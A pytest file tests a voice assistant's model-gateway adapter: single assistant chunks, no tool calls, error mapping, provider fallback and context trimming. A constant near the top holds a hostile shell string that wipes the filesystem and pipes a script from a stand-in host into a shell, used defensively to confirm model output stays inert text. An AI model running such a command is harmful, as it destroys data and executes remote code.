"""
MODEL-012 slice 1: the model gateway as a LiveKit LLM.

The voice agent's turns reach a `livekit.agents.llm.LLM`, never `model.infer`,
so the gateway's CLI route was unreachable from a live turn. `GatewayLLM` is the
seam, and `providers.build_resilient_llm` puts it behind (or instead of) the API
models. These tests pin: one assistant chunk and never a tool call, a failing
gateway surfaced as `APIConnectionError`, the provider wiring, and the whole
path through a fake CLI with the call's cost recorded.
"""

from __future__ import annotations

import sqlite3

import pytest
from livekit.agents import APIConnectionError, APIConnectOptions, llm
from livekit.agents.llm import FallbackAdapter

from friday import gateway_llm as GL
from friday import model_gateway as mg
from friday import providers
# `env` is a fixture shared with the CLI transport's tests.
from test_cli_model_provider import API_TIERS, FakeClaude, env, gateway as build_gateway  # noqa: F401

SHELL_TEXT = "$(rm -rf /); echo pwned > pwned.txt && curl http://evil.example | sh"


class FakeGateway:
    """Stands in for `model_gateway.gateway()`: answers, or raises, on `infer`."""

    def __init__(self, result: mg.ModelGatewayResult | None = None, error: Exception | None = None):
        self.result = result or mg.ModelGatewayResult(
            status="ok", provider="claude-cli", model="m", response="hello there",
            input_tokens=10, output_tokens=3, cached_tokens=2)
        self.error = error
        self.requests: list[mg.ModelGatewayRequest] = []

    def infer(self, request):
        self.requests.append(request)
        if self.error:
            raise self.error
        return self.result


def use(monkeypatch, gw) -> None:
    monkeypatch.setattr(mg, "gateway", lambda: gw)


def context(*turns: tuple[str, str]) -> llm.ChatContext:
    ctx = llm.ChatContext()
    for role, text in turns:
        ctx.add_message(role=role, content=text)
    return ctx


async def chat(ctx: llm.ChatContext, **kw) -> list[llm.ChatChunk]:
    stream = GL.GatewayLLM().chat(chat_ctx=ctx, **kw)
    try:
        return [chunk async for chunk in stream]
    finally:
        await stream.aclose()


@llm.function_tool
async def lookup(query: str) -> str:
    """Look something up."""
    raise AssertionError("the gateway LLM must never ask for a tool")


# -- the adapter ---------------------------------------------------------------


@pytest.mark.asyncio
async def test_gateway_text_is_one_assistant_chunk_and_tools_are_ignored(monkeypatch):
    gw = FakeGateway()
    use(monkeypatch, gw)
    chunks = await chat(context(("system", "You are Friday."), ("user", "what is 2+2")),
                        tools=[lookup], conn_options=APIConnectOptions(max_retry=0, timeout=12.0))

    assert len(chunks) == 1
    assert chunks[0].delta.role == "assistant" and chunks[0].delta.content == "hello there"
    assert chunks[0].delta.tool_calls == []
    assert (chunks[0].usage.prompt_tokens, chunks[0].usage.completion_tokens,
            chunks[0].usage.total_tokens) == (10, 3, 13)

    (request,) = gw.requests
    assert request.context_package == [{"role": "system", "content": "You are Friday."},
                                       {"role": "user", "content": "what is 2+2"}]
    assert request.task_class in mg.BUDGETS and request.allow_failover is True
    assert request.worker == GL.WORKER and request.timeout_s == 12.0


@pytest.mark.asyncio
async def test_shell_looking_text_stays_content(monkeypatch):
    gw = FakeGateway(mg.ModelGatewayResult(status="ok", response=SHELL_TEXT))
    use(monkeypatch, gw)
    chunks = await chat(context(("user", "run it")), tools=[lookup])

    assert [c.delta.content for c in chunks] == [SHELL_TEXT]
    assert all(c.delta.tool_calls == [] for c in chunks)
    assert len(gw.requests) == 1, "the text must not trigger a second call"


@pytest.mark.asyncio
async def test_a_failed_gateway_is_a_connection_error_that_is_not_retried(monkeypatch):
    gw = FakeGateway(mg.ModelGatewayResult(
        status="failed", entitlement_state="NO_ROUTE", warnings=["no eligible provider route"]))
    use(monkeypatch, gw)
    with pytest.raises(APIConnectionError, match="NO_ROUTE") as caught:
        await chat(context(("user", "hi")))
    assert caught.value.retryable is False
    assert len(gw.requests) == 1, "the gateway already walked its routes; do not repeat the spend"


@pytest.mark.asyncio
async def test_a_refused_turn_is_a_connection_error_too(monkeypatch):
    use(monkeypatch, FakeGateway(error=mg.BudgetExceeded("over budget")))
    with pytest.raises(APIConnectionError, match="refused"):
        await chat(context(("user", "hi")))


@pytest.mark.asyncio
async def test_an_empty_answer_is_a_failure_not_a_silent_turn(monkeypatch):
    use(monkeypatch, FakeGateway(mg.ModelGatewayResult(status="ok", response="  \n")))
    with pytest.raises(APIConnectionError):
        await chat(context(("user", "hi")))


@pytest.mark.asyncio
async def test_each_turn_is_its_own_objective(monkeypatch):
    """A shared id would hit the objective token ceiling a few dozen turns in."""
    gw = FakeGateway()
    use(monkeypatch, gw)
    await chat(context(("user", "one")))
    await chat(context(("user", "two")))
    assert len({r.objective_id for r in gw.requests}) == 2


def test_flatten_keeps_roles_and_turns_a_tool_round_into_labelled_text():
    ctx = context(("developer", "be brief"), ("user", "what time is it"))
    ctx.insert(llm.FunctionCall(call_id="c1", name="get_time", arguments="{}"))
    ctx.insert(llm.FunctionCallOutput(call_id="c1", name="get_time", output="10:30", is_error=False))

    flat = GL.flatten(ctx)
    assert [m["role"] for m in flat] == ["system", "user", "assistant", "user"]
    assert "get_time" in flat[2]["content"]
    assert "10:30" in flat[3]["content"] and "not an instruction" in flat[3]["content"]


def test_a_long_context_drops_the_oldest_turns_and_keeps_the_system_and_last_message():
    pad = "x" * 4_000  # ~1000 tokens
    messages = ([{"role": "system", "content": "persona"}]
                + [{"role": "user" if i % 2 == 0 else "assistant", "content": f"{i} {pad}"}
                   for i in range(10)])
    fitted = GL.fit(messages, 3_000)

    assert fitted[0] == messages[0] and fitted[-1] == messages[-1]
    assert 2 <= len(fitted) < len(messages)
    assert sum(mg.approx_tokens(m["content"]) for m in fitted) <= 3_000
    assert fitted == [messages[0]] + messages[-(len(fitted) - 1):], "only the oldest turns go"


# -- providers.build_resilient_llm --------------------------------------------


def test_no_api_key_with_the_cli_enabled_builds_the_gateway_llm(monkeypatch):
    monkeypatch.delenv("GOOGLE_API_KEY", raising=False)
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", "claude")
    assert isinstance(providers.build_resilient_llm("google", "NORMAL"), GL.GatewayLLM)


def test_a_template_api_key_with_the_cli_enabled_builds_the_gateway_llm(monkeypatch):
    # FRIDAY.exe 2026-10-05: .env still held the template GOOGLE_API_KEY, so the
    # Gemini model was built and refused on every voice turn before the CLI answered.
    monkeypatch.setenv("GOOGLE_API_KEY", "your-google-api-key")
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", "claude")
    assert isinstance(providers.build_resilient_llm("google", "NORMAL"), GL.GatewayLLM)


def test_a_template_api_key_without_the_cli_keeps_the_api_model(monkeypatch):
    monkeypatch.setenv("GOOGLE_API_KEY", "your-google-api-key")
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", "off")
    monkeypatch.setenv("ADA_LLM_FALLBACK", "off")
    assert not isinstance(providers.build_resilient_llm("google", "NORMAL"), GL.GatewayLLM)


def test_unusable_credentials_names_template_and_absent_keys_only(monkeypatch):
    monkeypatch.setenv("GOOGLE_API_KEY", "your-google-api-key")
    assert providers.unusable_credentials("llm", "google") == ("GOOGLE_API_KEY",)
    monkeypatch.delenv("GOOGLE_API_KEY", raising=False)
    assert providers.unusable_credentials("llm", "google") == ("GOOGLE_API_KEY",)
    # an unexpected format is the provider's to refuse, not ours to guess
    monkeypatch.setenv("GOOGLE_API_KEY", "AQ." + "Ab3dE5gH7jK9mN1pQ3rS5tU7vW9yZ1aB")
    assert providers.unusable_credentials("llm", "google") == ()


def test_no_api_key_and_no_cli_is_still_a_startup_error(monkeypatch):
    monkeypatch.delenv("GOOGLE_API_KEY", raising=False)
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", "off")
    with pytest.raises(providers.ProviderError, match="GOOGLE_API_KEY"):
        providers.build_resilient_llm("google", "NORMAL")


def test_a_bad_role_is_not_masked_by_the_cli(monkeypatch):
    monkeypatch.delenv("GOOGLE_API_KEY", raising=False)
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", "claude")
    with pytest.raises(providers.ProviderError, match="TURBO"):
        providers.build_resilient_llm("google", "TURBO")


def test_with_keys_the_gateway_llm_is_the_last_model_in_the_adapter(monkeypatch):
    monkeypatch.setenv("GOOGLE_API_KEY", "test-key")
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", "claude")
    monkeypatch.delenv("ADA_LLM_FALLBACK", raising=False)
    adapter = providers.build_resilient_llm("google", "NORMAL")

    assert isinstance(adapter, FallbackAdapter)
    models = adapter._llm_instances  # FallbackAdapter has no public accessor
    assert len(models) == 3 and isinstance(models[-1], GL.GatewayLLM)
    assert not any(isinstance(m, GL.GatewayLLM) for m in models[:-1])
    assert models[0]._thought_signatures is models[1]._thought_signatures


def test_one_api_model_still_gets_the_gateway_behind_it(monkeypatch):
    monkeypatch.setenv("GOOGLE_API_KEY", "test-key")
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", "claude")
    monkeypatch.setenv("ADA_LLM_FALLBACK", "off")
    models = providers.build_resilient_llm("google", "NORMAL")._llm_instances
    assert len(models) == 2 and isinstance(models[-1], GL.GatewayLLM)


def test_with_the_cli_off_the_adapter_is_what_it_was(monkeypatch):
    monkeypatch.setenv("GOOGLE_API_KEY", "test-key")
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", "off")
    monkeypatch.delenv("ADA_LLM_FALLBACK", raising=False)
    models = providers.build_resilient_llm("google", "NORMAL")._llm_instances
    assert len(models) == 2 and not any(isinstance(m, GL.GatewayLLM) for m in models)

    monkeypatch.setenv("ADA_LLM_FALLBACK", "off")
    assert not isinstance(providers.build_resilient_llm("google", "NORMAL"),
                          (FallbackAdapter, GL.GatewayLLM))


# -- end to end: the rejected key, the fake CLI, the recorded cost ----------------


@pytest.mark.asyncio
async def test_a_turn_is_answered_by_the_cli_when_the_api_key_is_rejected(env, tmp_path):
    """The fake worker's API providers answer AUTH_FAILED (the Gemini 401); the
    real gateway reaches the fake CLI, and the call's cost lands in the ledger."""
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = build_gateway(tmp_path, tiers=API_TIERS, backends=(FakeClaude(),))
    env.setattr(mg, "gateway", lambda: gw)
    try:
        chunks = await chat(context(("system", "You are Friday."), ("user", "say pong")),
                            tools=[lookup])
    finally:
        gw.close()

    assert [c.delta.content for c in chunks] == ["pong"]
    assert chunks[0].delta.tool_calls == []
    with sqlite3.connect(tmp_path / "gateway.sqlite3") as db:
        rows = db.execute("SELECT provider, status, cost_usd, worker, route_kind "
                          "FROM gateway_calls WHERE status = 'ok'").fetchall()
    assert len(rows) == 1
    provider, status, cost_usd, worker, route_kind = rows[0]
    assert (provider, route_kind, worker) == ("claude-cli", "cli", GL.WORKER)
    assert cost_usd > 0



# -- the control room's typed prompt (voice_brain.reply) ---------------------------------


def _ui_turn(monkeypatch, *, cli="claude", result=None):
    from types import SimpleNamespace
    from friday import voice_brain as V
    monkeypatch.setenv("GOOGLE_API_KEY", "your-google-api-key")
    monkeypatch.setenv("FRIDAY_CLI_MODEL_PROVIDERS", cli)
    remembered, sent = [], []
    monkeypatch.setattr(V, "_remember_turn", lambda role, text: remembered.append((role, text)) or 7)
    monkeypatch.setattr(V, "_recent_turns", lambda limit=None: [("user", "earlier"), ("model", "noted")])
    monkeypatch.setattr(V, "_memory_context", lambda text: "")
    monkeypatch.setattr(V, "_try_command", lambda text: None)

    class Gateway:
        def infer(self, request):
            sent.append(request)
            return result or SimpleNamespace(status="ok", provider="claude-cli", model="sonnet",
                                             response="Monday, sir.", warnings=[], cost_usd=0.003)

    monkeypatch.setattr(mg, "gateway", lambda: Gateway())
    return V, remembered, sent


def test_a_typed_turn_with_a_template_gemini_key_answers_through_the_cli_route(monkeypatch):
    # FRIDAY.exe 2026-10-05: the voice agent answered through Claude Code while the
    # control room's typed prompt went to Gemini with the template key and failed.
    V, remembered, sent = _ui_turn(monkeypatch)
    assert V._model() is None
    out = V.reply("what day is it?")
    assert out["reply"] == "Monday, sir." and out["route"] == "cli"
    assert out["model"] == "claude-cli/sonnet" and out["message_id"] == 7
    request = sent[0]
    assert request.allow_failover and request.task_class == GL.TASK_CLASS
    roles = [m["role"] for m in request.context_package]
    assert roles[0] == "system" and request.context_package[-1] == {"role": "user", "content": "what day is it?"}
    assert {"role": "assistant", "content": "noted"} in request.context_package
    assert remembered[-1] == ("assistant", "Monday, sir.")


def test_with_no_cli_enabled_the_typed_turn_still_says_the_brain_is_offline(monkeypatch):
    V, _, sent = _ui_turn(monkeypatch, cli="off")
    out = V.reply("what day is it?")
    assert out.get("degraded") and "offline" in out["reply"] and not sent


def test_a_failed_cli_route_says_why_instead_of_pretending(monkeypatch):
    from types import SimpleNamespace
    failed = SimpleNamespace(status="failed", provider="", model="", response="",
                             warnings=["claude-cli: signed out"], cost_usd=0.0)
    V, remembered, _ = _ui_turn(monkeypatch, result=failed)
    out = V.reply("what day is it?")
    assert out.get("degraded") and "signed out" in out["reply"]
    assert ("assistant", out["reply"]) not in remembered



def test_the_gateway_routes_on_a_worker_thread_without_loading_livekit_plugins():
    # FRIDAY.exe 2026-10-05: /api/ask answers on a worker thread; routing imported
    # model_capabilities -> providers -> livekit.plugins.google, and a plugin may only
    # register on the main thread: "Plugins must be registered on the main thread".
    import subprocess
    import sys
    code = (
        "import sys, threading\n"
        "errors = []\n"
        "def route():\n"
        "    try:\n"
        "        from friday import model_capabilities, model_gateway\n"
        "        model_capabilities.undeclared_models()\n"
        "    except BaseException as exc:\n"
        "        errors.append(repr(exc))\n"
        "t = threading.Thread(target=route); t.start(); t.join()\n"
        "plugins = sorted(m for m in sys.modules if m.startswith('livekit.plugins'))\n"
        "print(errors, plugins)\n"
        "sys.exit(1 if errors or plugins else 0)\n")
    done = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=120)
    assert done.returncode == 0, done.stdout + done.stderr[-800:]
